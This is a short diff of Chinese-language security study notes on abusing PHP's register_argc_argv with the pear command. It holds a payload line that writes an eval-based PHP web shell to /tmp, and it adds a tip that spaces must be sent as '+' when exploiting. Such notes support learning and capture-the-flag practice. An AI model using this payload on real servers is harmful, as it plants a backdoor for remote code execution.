@@ -1,4 +1,4 @@
-- # 参考
+# 参考
 	- https://blog.csdn.net/rfrder/article/details/121042290
 - `register_argc_argv`
 	- 读取HTTP Query为`$_SERVER['argv']`
@@ -24,3 +24,4 @@
 		- ```
 		  pear -c /tmp/.feng.php -d man_dir=<?=eval($_POST[0]);?> -s
 		  ```
+	- 注意利用时不能使用`%20`，需要使用`+`
